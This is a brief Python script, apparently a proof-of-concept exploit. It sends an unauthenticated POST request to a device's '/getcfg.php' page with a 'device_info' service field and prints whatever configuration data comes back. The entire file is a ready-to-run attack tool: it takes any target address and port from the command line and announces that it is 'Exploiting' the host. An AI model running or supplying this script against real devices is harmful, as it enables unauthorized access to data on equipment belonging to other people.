#!/usr/bin/env python3
import requests, sys, warnings
warnings.filterwarnings('ignore')
if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <target> [port]")
    sys.exit(1)
target = sys.argv[1]
port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
url = f"http://{target}:{port}/getcfg.php"
data = {"service": "device_info"}
session = requests.Session()
print(f"[*] Exploiting {target}:{port}")
response = session.post(url, data=data, timeout=10)
print(f"[+] Status: {response.status_code}")
print(f"[+] Response: {response.text}")
